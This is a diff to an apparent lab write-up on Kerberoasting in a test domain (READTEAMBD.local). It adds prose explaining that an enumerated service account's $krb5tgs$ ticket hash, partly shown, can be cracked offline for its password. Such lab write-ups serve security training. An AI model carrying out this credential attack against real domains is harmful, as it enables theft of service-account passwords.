@@ -1,4 +1,4 @@
-# kerberosting attack
+# Kerberosting Attack
 
 **Date:** June 2026  
 **Author:** ShahinSecLab  
@@ -110,7 +110,9 @@ ReadTeamBD-DC/SQLService.READTEAMBD.local:6011  sqlservice  CN=Group Policy Crea
 
 $krb5tgs$23$*sqlservice$READTEAMBD.LOCAL$ReadTeamBD-DC/SQLService.READTEAMBD.local~6011*$96f871a359f348008f60f60c2ec9c111$0661ac2eeb77cd03dbf48722c056055adcfbab......
 ```
+From the output, I identified a service account named sqlservice with an SPN registered in the domain. The command also returned the Kerberos TGS ticket as a $krb5tgs$ hash, which can be cracked offline to recover the service account's password.
 
+Information gathered:
 - Service Account: sqlservice
 - SPN: SQLService.READTEAMBD.local
 - Domain: READTEAMBD.local
